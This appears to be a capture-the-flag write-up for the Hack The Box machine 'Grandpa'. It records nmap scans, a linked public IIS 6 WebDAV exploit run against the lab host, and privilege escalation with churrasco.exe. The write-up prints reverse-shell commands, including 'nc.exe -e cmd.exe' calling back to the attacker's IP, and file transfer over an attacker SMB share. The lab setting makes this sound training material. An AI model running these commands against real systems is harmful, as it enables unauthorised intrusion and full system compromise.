<img src="Pasted image 20240722182930.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
```
ping 10.10.10.14
```
![[Pasted image 20240619131544.png]]

Nmap Default Scan
```
nmap 10.10.10.14 -oN dnmap
```
![[Pasted image 20240619131642.png]]

Nmap Script and Service Scan
```
nmap 10.10.10.14 -sC -sV -A -oN snmap
```
![[Pasted image 20240619131851.png]]
We can see the path now...!

All port Scan
```
nmap 10.10.10.14 -p- --open -T5 -oN anmap
```
![[Pasted image 20240619135050.png]]

On Port 80
![[Pasted image 20240619131930.png]]



Will search for public exploit
![[Pasted image 20240619135234.png]]
Found one https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell

Will run the exploit
```
python2 exp.py 10.10.10.14 80 10.10.14.2 443
```
![[Pasted image 20240619135255.png]]

Got Reverse shell
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240619135336.png]]

Will jump  to Privilege Escalation....! 

Wii get System info
![[Pasted image 20240619135439.png]]
Got the vulnerable one..!

Get the binary from the link https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
And Shared it to the target machine via smb
```
impacket-smbserver kali .
```
![[Pasted image 20240619135631.png]]
```
copy \\10.10.14.2\kali\churrasco.exe
```
![[Pasted image 20240619135707.png]]

Now will run the binary
![[Pasted image 20240619135727.png]]
It Worked..!

Will get the reverse shell using nc.exe, First will transfer nc.exe to target machine
```
copy \\10.10.14.2\kali\nc.exe
```
![[Pasted image 20240619135654.png]]

Now will get the reverse shell
```
churrasco.exe "nc.exe -e cmd.exe 10.10.14.2 443"
```
![[Pasted image 20240619135849.png]]

```
rlwrap nc -nvlp 443
```
![[Pasted image 20240619140010.png]]
Got it.....!

Will get the flags
```
dir /s /b "C:\Documents and Settings\*.txt"
```
![[Pasted image 20240619140142.png]]
Got the locations.

**User.txt**
![[Pasted image 20240619140237.png]]

Root.txt
![[Pasted image 20240619140323.png]]


Done with Grandpa......:)

